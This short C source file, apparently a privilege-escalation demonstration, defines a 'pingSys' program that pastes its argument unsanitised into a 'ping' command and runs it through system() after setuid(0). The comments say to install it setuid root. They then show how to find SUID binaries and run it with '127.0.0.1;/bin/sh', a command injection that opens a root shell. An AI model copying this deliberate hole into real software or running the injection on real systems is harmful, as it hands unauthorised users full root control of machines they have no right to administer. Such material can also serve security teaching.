
/*############################################################################################
The "C" code below should be compiled and run in /usr/bin as root and set the permissions as:
-rwsr-xr-x 1 root root 16840 Oct 28 14:13 pingSys 
############################################################################################*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int BUFFERSIZE = 512;

void main(int argc, char** argv) {
  char ipaddr[BUFFERSIZE];
  snprintf(ipaddr, BUFFERSIZE, "ping -c 4 %s", argv[1]);
  if(setuid(0) == -1) printf("setUID ERROR");
  system(ipaddr);
}

/*####################################################################################################
After that as user it is possible "Escalate Privilege" Or if pingsys is already running in the system:


$ find / -perm /4000 -type f 2>/dev/null           
          
          #If "pingsys" is on the list:

$ /usr/bin/pingsys '127.0.0.1;/bin/sh'

          #You got root access.
######################################################################################################*/      
